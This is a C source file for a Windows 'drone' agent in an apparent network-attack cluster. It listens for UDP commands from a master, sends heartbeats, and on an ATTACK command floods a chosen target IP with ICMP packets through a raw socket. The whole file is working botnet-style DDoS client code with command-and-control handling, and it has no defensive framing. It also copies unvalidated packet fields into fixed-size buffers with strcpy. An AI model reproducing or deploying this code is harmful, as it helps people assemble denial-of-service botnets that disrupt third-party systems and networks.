/*
 * windows_drone.c
 * Native Windows implementation of the Drone Agent.
 * Compiles with MinGW: gcc src/windows_drone.c -o drone.exe -lws2_32
 */

#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <process.h>

#pragma comment(lib, "ws2_32.lib")

#define CLUSTER_PORT 7123
#define CLUSTER_MAGIC 0xDEADBEEF

// --- Protocol Definition (Copy from cluster.h) ---
typedef enum {
    CMD_DISCOVERY   = 1,
    CMD_OFFER       = 2,
    CMD_ATTACK      = 3,
    CMD_STOP        = 4,
    CMD_HEARTBEAT   = 5
} cluster_cmd_t;

typedef struct {
    uint32_t magic;
    uint32_t cmd;
    char sender_ip[16]; 
    char target_ip[16];
    int attack_mode; 
} cluster_packet_t;

// --- Globals ---
volatile int attack_active = 0;
char current_target[16];
HANDLE attack_thread_handle = NULL;

// Heartbeat
char master_ip[16] = {0};
SOCKET udp_sock = INVALID_SOCKET;

// --- Attack Thread ---
unsigned __stdcall attack_worker(void *arg) {
    (void)arg;
    printf("[DRONE] Attack started on %s\n", current_target);
    
    SOCKET raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (raw_sock == INVALID_SOCKET) {
        printf("[ERROR] Failed to create RAW socket (Run as Admin?): %d\n", WSAGetLastError());
        _endthreadex(0);
        return 0;
    }
    
    // Set socket option to include IP header? No, just send payload
    // Windows Raw Sockets are tricky. 
    // Just send zeros.
    
    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    inet_pton(AF_INET, current_target, &dest.sin_addr);

    char packet[64];
    memset(packet, 0, sizeof(packet));
    packet[0] = 8; 

    while (attack_active) {
        sendto(raw_sock, packet, sizeof(packet), 0, (struct sockaddr *)&dest, sizeof(dest));
        Sleep(10); 
    }

    closesocket(raw_sock);
    printf("[DRONE] Attack stopped.\n");
    _endthreadex(0);
    return 0;
}

unsigned __stdcall heartbeat_worker(void *arg) {
    (void)arg;
    printf("[DRONE] Heartbeat active -> %s\n", master_ip);

    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(CLUSTER_PORT);
    inet_pton(AF_INET, master_ip, &dest.sin_addr);

    cluster_packet_t pkt;
    pkt.magic = CLUSTER_MAGIC;
    pkt.cmd = CMD_HEARTBEAT;
    strcpy(pkt.sender_ip, "WIN_DRONE");

    while(1) {
        sendto(udp_sock, (char*)&pkt, sizeof(pkt), 0, (struct sockaddr*)&dest, sizeof(dest));
        Sleep(5000); // 5 sec
    }
    return 0;
}

int main(int argc, char *argv[]) {
    printf("=== NETWORK MAP WINDOWS DRONE ===\n");
    
    // Parse Args
    for(int i=1; i<argc; i++) {
        if (strcmp(argv[i], "-m") == 0 || strcmp(argv[i], "--master") == 0) {
            if (i+1 < argc) {
                strncpy(master_ip, argv[i+1], 15);
            }
        }
    }

    printf("Initializing Winsock...\n");

    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) {
        printf("Failed. Error Code : %d\n", WSAGetLastError());
        return 1;
    }

    if ((udp_sock = socket(AF_INET, SOCK_DGRAM, 0)) == INVALID_SOCKET) {
        printf("Could not create socket : %d\n", WSAGetLastError());
        return 1;
    }
    
    // Bind to listen for Commands
    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY;
    server.sin_port = htons(CLUSTER_PORT);

    if (bind(udp_sock, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR) {
        printf("Bind failed with error code : %d\n", WSAGetLastError());
        return 1;
    }

    printf("[INFO] Listening on UDP Port %d...\n", CLUSTER_PORT);
    
    if (strlen(master_ip) > 0) {
        _beginthreadex(NULL, 0, heartbeat_worker, NULL, 0, NULL);
    } else {
        printf("[INFO] No Master IP provided (-m). Waiting for Discovery (LAN only).\n");
    }

    cluster_packet_t pkt;
    struct sockaddr_in si_other;
    int slen = sizeof(si_other);
    
    while(1) {
        int recv_len;
        if ((recv_len = recvfrom(udp_sock, (char *)&pkt, sizeof(pkt), 0, (struct sockaddr *) &si_other, &slen)) == SOCKET_ERROR) {
            printf("recvfrom() failed : %d\n", WSAGetLastError());
            break;
        }

        if (pkt.magic != CLUSTER_MAGIC) continue;

        char ip_str[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &si_other.sin_addr, ip_str, INET_ADDRSTRLEN);

        if (pkt.cmd == CMD_DISCOVERY) {
            printf("[CMD] DISCOVERY from %s\n", ip_str);
            
            cluster_packet_t reply;
            reply.magic = CLUSTER_MAGIC;
            reply.cmd = CMD_OFFER;
            strcpy(reply.sender_ip, "WIN_DRONE");

            sendto(udp_sock, (char *)&reply, sizeof(reply), 0, (struct sockaddr *)&si_other, slen);
        }
        else if (pkt.cmd == CMD_ATTACK) {
            printf("[CMD] ATTACK -> %s\n", pkt.target_ip);
            
            if (attack_active) {
                attack_active = 0;
                WaitForSingleObject(attack_thread_handle, 1000);
                CloseHandle(attack_thread_handle);
            }

            strcpy(current_target, pkt.target_ip);
            attack_active = 1;
            attack_thread_handle = (HANDLE)_beginthreadex(NULL, 0, attack_worker, NULL, 0, NULL);
        }
        else if (pkt.cmd == CMD_STOP) {
            printf("[CMD] STOP\n");
            attack_active = 0;
        }
    }

    closesocket(udp_sock);
    WSACleanup();
    return 0;
}
